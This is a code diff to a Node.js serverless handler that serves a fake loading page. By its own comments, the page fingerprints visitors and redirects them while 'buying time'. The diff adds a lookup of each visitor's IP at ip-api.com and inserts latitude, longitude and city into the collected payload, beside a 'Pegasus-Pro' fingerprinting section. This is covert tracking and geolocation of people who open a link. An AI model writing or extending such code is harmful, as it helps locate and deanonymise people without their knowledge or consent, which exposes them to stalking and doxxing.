@@ -16,6 +16,14 @@ module.exports = async (req, res) => {
     const ipRaw = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.socket.remoteAddress || '';
     const cleanIp = ipRaw.split(',')[0].trim();
 
+    let geo = {};
+    if (cleanIp) {
+        try {
+            const geoReq = await axios.get(`http://ip-api.com/json/${cleanIp}`);
+            geo = geoReq.data;
+        } catch (e) { }
+    }
+
     // We serve an HTML page that does the fingerprinting + redirection
     // This allows us to use Browser APIs and gives a fake loading screen to buy time
     const html = `<!DOCTYPE html>
@@ -65,6 +73,9 @@ module.exports = async (req, res) => {
 
             const payload = {
                 ip: "${cleanIp}",
+                lat: ${geo.lat || 'null'},
+                lon: ${geo.lon || 'null'},
+                city: "${geo.city || geo.regionName || 'Unknown'}",
                 ua: navigator.userAgent,
                 time: new Date().toISOString(),
                 // Fingerprinting Level 4 (Pegasus-Pro)
